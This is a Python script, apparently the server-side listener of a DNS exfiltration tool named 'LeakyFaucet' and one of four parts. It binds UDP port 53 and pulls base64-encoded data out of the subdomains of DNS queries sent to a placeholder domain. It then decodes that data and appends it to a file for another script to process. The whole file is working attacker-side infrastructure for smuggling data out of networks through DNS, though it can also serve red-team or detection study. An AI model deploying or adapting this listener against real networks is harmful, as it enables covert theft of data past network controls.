#LeakyFaucet Server Listener v1.3.0
#Written: Mr. Waterhouse - based on a script by: https://hinty.io/devforth/dns-exfiltration-of-data-step-by-step-simple-guide/
#May 10, 2023
#
#This is script 1 of 4 required on the server side of LeakyFaucet.
#
#The Listener script listens on port UDP 53 and parses out DNS queries destined for a specific domain. Once received, the requested is decoded from base64
#and any padding is removed. The decoded/cleaned entry is then written to a file which is monitored by the Filemon script for further processing.



#Define the entire script as a function so that I can put it in a loop. That way if it fails, it can restart itself.
def my_script():
    #Import required libraries
    import socket
    import re
    import binascii
    from dnslib import DNSRecord
    import base64

    #Setup DNS Listener
    UDP_IP = "0.0.0.0"
    UDP_PORT = 53

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((UDP_IP, UDP_PORT))
    sock.setblocking(0)  # Set socket to non-blocking mode

    #Create a set to help us determine if we have duplicate requests. 
    seen_lines = set()

    #Define DNS data file.
    filename = "/home/ubuntu/lfdata/lf_data.txt"

    while True:
        try:
            byteData, addr = sock.recvfrom(2048)
            if byteData:
                msg = binascii.unhexlify(binascii.b2a_hex(byteData))
                msg = DNSRecord.parse(msg)
                m = re.search(r'\;(\S+)\.sampledomain\.xyz', str(msg), re.MULTILINE)		#You need to enter your domain data here.
                if m:
                    line = m.group(1)
                    if line not in seen_lines:		#We do not want to process query retries
                        print('got data:', m.group(1))  #Print the b64 encoded data to screen
                        #decoded_line = base64.b64decode(line).decode('utf-8')   #Decode the base64 
                        decoded_line = base64.b64decode(line).decode('utf-8').rstrip('x')   #Decode and strip trailing x characters 
                        with open(filename, "a") as f:
                            f.write(decoded_line + "\n")   #write decoded data to pico_data.txt
                        seen_lines.add(line)		#Update our seen_lines set to ensure that we don't process repeat entries. All entries should be unique due to session id.
        except BlockingIOError:
            # No data to receive, continue to next iteration
            pass

#If for some reason, the main while loop is exited, Restart the function.
while True:
    my_script()